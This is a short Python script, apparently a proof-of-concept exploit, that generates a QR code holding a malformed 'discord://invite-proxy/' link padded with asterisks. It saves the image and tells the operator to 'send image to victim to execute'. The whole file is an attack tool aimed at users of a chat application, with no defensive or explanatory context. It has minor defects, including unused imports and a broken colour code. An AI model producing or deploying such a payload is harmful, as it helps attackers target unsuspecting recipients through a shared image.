
import requests
import sys
import qrcode
import random

class Exploit:

    def __init__(self):
        print("\033[31mGenerating payload!\033[0m")

    def execute(self):
        uri = "<discord://invite-proxy/"+"*"*20+">"
        filename = "QRcode{}.png".format(str(random.randint(1000,9000)))
        x = qrcode.make(uri)
        x.save(filename)
        print("Saved QR code to {}".format(filename))
        print("\033[32Done making payload, send image to victim to execute!\033[0m")


def main():
    exploit = Exploit()
    exploit.execute()

if __name__ == '__main__':
    main()
    
